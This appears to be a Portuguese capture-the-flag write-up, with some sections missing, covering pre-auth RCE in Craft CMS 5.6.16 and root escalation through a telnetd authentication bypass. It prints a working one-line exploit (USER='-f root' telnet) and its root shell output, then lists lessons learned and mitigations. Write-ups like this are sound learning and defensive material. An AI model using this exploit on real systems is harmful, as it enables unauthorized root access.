## 2. Exploração Inicial — CVE-2025-32432

A versão Craft CMS **5.6.16** é vulnerável a **CVE-2025-32432** — Remote Code Execution pré-autenticação no endpoint de asset transform.

**Descrição:**  
O endpoint `/actions/assets/generate-transform` (ou `/index.php?p=admin/actions/assets/generate-transform`) permite injeção de objetos PHP via desserialização insegura (gadget chain do Yii). Não requer autenticação. Basta um `assetId` válido.

## 4. Privilege Escalation — CVE-2026-24061

### 4.1 Enumeração Local

SUID, capabilities, cron e timers não revelaram nada útil. A chave foi a enumeração de serviços locais:

```bash
ss -tulpn
# tcp  LISTEN  127.0.0.1:23  ...

ps aux | grep inet
# root  1000  /usr/sbin/inetutils-inetd

telnet --version
# telnet (GNU inetutils) 2.7
```

Porta **23 (telnet)** escutando apenas em `localhost` + versão **2.7** → vulnerável a **CVE-2026-24061**.

### 4.2 Exploração do Telnetd

**CVE-2026-24061** permite Authentication Bypass no GNU inetutils telnetd.  
A variável de ambiente `USER` é repassada de forma insegura para o binário `login`.  
Ao setar `USER="-f root"`, o login interpreta a sessão como já autenticada como root.

**Exploit:**

```bash
USER="-f root" telnet -a 127.0.0.1
```

**Resultado:**

```bash
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)

root@orion:~# cat /root/root.txt
```

## 6. Aprendizados

1. **Craft CMS** — Sempre fingerprintar a versão e procurar CVEs recentes (especialmente pre-auth RCE).
2. **`.env`** — Um dos primeiros lugares a olhar após foothold em aplicações web modernas.
3. **Password reuse** — Hash do CMS reutilizado no usuário do sistema (muito comum).
4. **Local services** — Sempre enumerar portas em `127.0.0.1` após ganhar shell. Serviços legados (telnet, etc.) ainda existem.
5. **CVE-2026-24061** — Lembrete de que softwares “antigos” ainda são instalados e podem ter falhas críticas de design (variável de ambiente `USER`).

---

## 7. Mitigações Recomendadas

1. Atualizar Craft CMS para versão ≥ **5.6.17** (ou 4.14.15 / 3.9.15).
2. Remover ou desabilitar o `telnetd` / `inetutils-inetd` (serviço legado e inseguro).
3. Não reutilizar senhas entre aplicação e sistema operacional.
4. Proteger arquivos `.env` (permissões corretas + fora do document root se possível).
5. Restringir serviços locais com firewall (mesmo em 127.0.0.1 quando possível).
